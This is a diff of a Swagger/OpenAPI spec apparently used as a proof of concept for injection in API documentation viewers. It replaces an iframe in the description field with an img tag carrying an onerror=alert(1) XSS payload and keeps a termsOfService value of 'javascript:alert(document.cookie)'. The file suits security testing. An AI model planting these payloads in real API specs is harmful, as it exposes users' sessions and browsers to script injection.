@@ -6,7 +6,7 @@ securityDefinitions:
 info:
   version: "0.0.1"
   title: Resource Injection POC
-  description: <h1>Iframe Injection</h1><iframe src="https://www.w3schools.com" title="W3Schools Free Online Web Tutorials"></iframe>
+  description: <h1>Iframe Injection</h1><img src="https://variety.com/" onerror=alert(1)>
   termsOfService: "javascript:alert(document.cookie)"
 paths:
   /:
